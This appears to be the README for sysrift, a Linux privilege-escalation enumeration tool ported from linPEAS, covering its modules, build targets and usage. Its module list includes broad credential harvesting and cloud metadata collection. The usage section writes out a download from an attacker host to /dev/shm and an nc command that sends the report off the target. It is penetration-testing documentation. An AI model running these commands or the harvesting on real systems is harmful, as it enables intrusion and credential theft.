# sysrift

A Linux privilege escalation enumeration tool compiled to a single static binary. Ported from [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) and rewritten in [Crystal](https://crystal-lang.org/) for drop-and-run deployment with no runtime dependencies.

## Why

linPEAS is the standard for Linux privesc enumeration, but it's a ~35,000 line Bash script that requires an interpreter, generates process noise, and buries findings in verbose output. sysrift addresses this:

- **Single static binary** -- drop in `/dev/shm`, run, delete. No interpreter, no dependencies.
- **Selective execution** -- run individual modules or combinations instead of a full sweep every time. Active checks (network connections, auth attempts) require explicit opt-in per execution via interactive prompt.
- **Severity-tagged output** -- `[!]` critical, `[+]` medium, `[-]` info, `[ok]` safe. Post-run summary surfaces only critical and medium findings.
- **Smaller footprint** -- one process, one log file. Self-destruct option removes the binary when done.
- **Cross-architecture** -- x86_64 and arm64 via static musl linking.

## Modules

`[A]` = includes active checks (opt-in via interactive prompt). See [ARCHITECTURE.md](ARCHITECTURE.md) for design details, [DETECTION.md](DETECTION.md) for detection logic and CVE coverage.

| # | Module | What it checks |
|---|--------|---------------|
| 1 | System Information | Identity, kernel version, interesting groups, env vars, PATH/interpreter library path hijacking, 15 kernel CVEs with distro backport detection, mount options, fstab credentials |
| 2 | SUID / SGID Binaries | GTFOBins cross-reference, writable binaries, nosuid/squashfs filtering, SGID group context, shared library injection analysis, strings-based path hijack on non-standard SUIDs |
| 3 | Sudo Rights | sudo -l + sudoers enumeration, NOPASSWD/GTFOBins/env_keep, 4 sudo CVEs, pivot target analysis, doas.conf, token reuse detection |
| 4 | Credential Hunting | History files, config file credentials, format-based secret scanning (AWS/GCP/GitHub/GitLab/Slack/SSH keys), shadow/passwd hashes, AuthorizedKeysFile analysis, PAM/LDAP creds, cached Kerberos/SSSD/Samba tickets, TTY audit harvesting, GitLab/Splunk/Log4j, self-hosted app configs (Mattermost/Gitea/Jenkins/Grafana, process-gated), database credential files (Redis/MySQL/PostgreSQL/MongoDB), mail spool readability, browser credential stores (Firefox/Chrome/Chromium/Brave/Vivaldi/Edge/Opera), password manager databases (KeePass/Password Safe), exposed .git directories in web roots (token extraction), PHP session file enumeration (ownership-filtered), wifi credentials (NetworkManager/wpa_supplicant, WPA-Enterprise vs PSK split), Terraform state and credentials.tfrc.json (depth-limited walk with skip set), Docker registry credentials (~/.docker/config.json), Kubernetes kubeconfig (host-side + ownership-aware), AI coding assistant credentials (.codex/.claude/.cursor/.gemini, per-tool patterns), GPG private key material (private-keys-v1.d + legacy secring, pass-store annotation), certificates and private keys (.p12/.pfx/.jks/.keystore + .pem/.key with PRIVATE-header peek), container pivot annotation on SSH keys |
| 5 | Writable Files & Dirs | /etc/passwd, shadow, sudoers, ld.so.preload, binfmt_misc register, ld.so.conf library paths, profile.d scripts, update-motd.d scripts, logrotate abuse (logrotten race), non-standard ACL detection, world-writable directories |
| 6 | Network Information | Interfaces, routes, listening ports, /etc/hosts, ARP, forwarding, legacy r-commands trust, firewall rules (iptables/nftables/UFW/firewalld) |
| 7 | Processes, Cron & Timers `[A]` | Root processes with writable binaries, non-standard root binary path detection, cron analysis (wildcards, writable targets, SSH/SCP/SFTP/rsync redirect, non-standard cron targets), systemd timers, chroot jail detection, open FD analysis, /proc environ harvesting. Active: 60s process sampling for hidden cron discovery |
| 8 | File Capabilities | Dangerous capabilities, cap+binary combo detection (43 entries), process capability enumeration via /proc, noise filtering (Chromium sandbox, SUID helpers, known daemons) |
| 9 | NFS Shares | /etc/exports no_root_squash, showmount, active NFS mounts |
| 10 | Container / Docker | Docker/LXC/K8s/Podman/containerd/CRI-O detection, runtime sockets, privileged mode, escape surfaces, namespace isolation, MAC profiles, runtime CVEs, escape tool presence, pivot network enumeration (fib_trie/ARP/hosts), host mount writability, user namespace mapping. K8s: service account token, RBAC permission analysis (20 dangerous verb+resource combos), resource enumeration (secrets/pods/services/nodes) |
| 11 | Installed Software `[A]` | Compilers, transfer tools, web servers, internal service detection (9 services), database services (MySQL/MariaDB/PostgreSQL), vulnerable software + userspace CVEs with backport detection, AD membership, sshd_config, session hijacking. Active: database default credential testing |
| 12 | Users & Groups | Password policy, UID 0 backdoor users, shell users, groups, login history, readable home dirs, SSH keys |
| 13 | Services | Running/enabled services, writable systemd units and timers, systemd PATH hijack detection (writable PATH dirs + relative ExecStart), writable init.d scripts |
| 14 | Interesting Files | Sensitive configs, backups, non-standard SUIDs, credential patterns in logs, recently modified files |
| 15 | Security Protections | AppArmor, SELinux, ASLR, 14 kernel hardening sysctl checks, lockdown mode, grsecurity/PaX, loaded kernel module analysis, permissive /dev/ device scan |
| 16 | D-Bus / PolicyKit | PolicyKit JS rules (group-aware), writable pkexec/D-Bus binaries, config directory writability |
| 17 | Cloud Environment `[A]` | 10 passive cloud indicators (AWS/GCP/Azure/DO/IBM), CLI tools, credential files, metadata routes. Active: IMDS harvest for 9 provider variants (IAM creds, tokens, user data) |

## Build

Requires [Crystal](https://crystal-lang.org/install/) 1.19+.

```bash
# Static x86_64 binary (recommended — no Docker required)
make x86_64-native

# Strip symbols (~30-40% size reduction)
make strip-native

# Native build (dynamic, for testing)
make local

# Static x86_64 binary via Docker (alternative)
make x86_64

# Static arm64 binary via Docker + QEMU
make arm64

# Syntax/type check only (no binary output)
make check
```

### Prerequisites

| Target | Requires |
|--------|----------|
| `make x86_64-native` | Crystal + musl-gcc (`apt install musl-tools`) |
| `make local` | Crystal installed natively |
| `make x86_64` | Docker + `crystallang/crystal:latest-musl` |
| `make arm64` | Docker + QEMU binfmt (`sudo apt install qemu-user-static binfmt-support`) |

Output binaries are placed in `dist/`.

## Usage

```bash
# Serve from attack box
python3 -m http.server 8080 -d dist/

# Drop to target (pick one)
curl http://<attacker>:8080/linaudit_x86_64_native -o /dev/shm/linaudit
wget http://<attacker>:8080/linaudit_x86_64_native -O /dev/shm/linaudit
scp dist/linaudit_x86_64_native user@target:/dev/shm/linaudit

# Run
chmod +x /dev/shm/linaudit && /dev/shm/linaudit
```

The interactive menu lets you:
- Run individual modules by number (e.g., `1` for System Information)
- Run multiple modules with comma separation (e.g., `1,3,5`)
- Run all modules with `0`
- List report files with `r`
- Self-destruct the binary with `x` (keeps report files)

Output is tee'd to a timestamped log file in `/dev/shm/` with ANSI codes stripped:

```bash
# View report
less -R /dev/shm/audit-report_<user>_<timestamp>.txt

# Copy off target
nc <remote-ip> 4444 < /dev/shm/audit-report_<user>_<timestamp>.txt
```

## Status

Active work-in-progress (v0.3.0 — also in `src/menu.cr` banner). All 17 modules are functional. See [ARCHITECTURE.md](ARCHITECTURE.md) for design details and [DETECTION.md](DETECTION.md) for detection logic.

## Known Limitations

- **No 32-bit (i686) support.** Crystal does not target 32-bit architectures. The binary fails with "Exec format error" on i686 systems -- a good example is HTB's retired Irked box (Debian 8, i686, kernel 3.16.0-6-686-pae). This is where interpreted tools like linPEAS win outright. Debian has dropped 32-bit ISOs and i686 is increasingly rare, but legacy infrastructure and older CTF boxes still run it.

- **`make x86_64-native` currently links against glibc, not musl.** The target name implies musl-static but the build command (`crystal build --static --link-flags "-static"`) uses the system `cc` toolchain. On a glibc-based dev host, the resulting binary is glibc-static and emits compile-time warnings for `dlopen`, `getaddrinfo`, and `gethostbyname` (pulled in by `mod_cloud`'s `http/client` for IMDS). At runtime the binary will demand the linker's glibc version on the target -- defeating the drop-and-run premise on systems with older glibc. **Until this is fixed, ship the `make x86_64` (Docker `crystallang/crystal:latest-musl`) build, not `make x86_64-native`.** Tracked as KANBAN backlog item O4.

## Legal

This tool is intended for authorized penetration testing, security research, and CTF competitions. Unauthorized use against systems you do not own or have explicit written permission to test is illegal. The author assumes no liability for misuse.

## Acknowledgements

sysrift is a port of [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) by [Carlos Polop](https://github.com/carlospolop), part of the [PEASS-ng](https://github.com/peass-ng/PEASS-ng) project. sysrift does not replicate every linPEAS check -- it focuses on the highest-signal vectors post-foothold, structured for selective execution rather than full-sweep output.
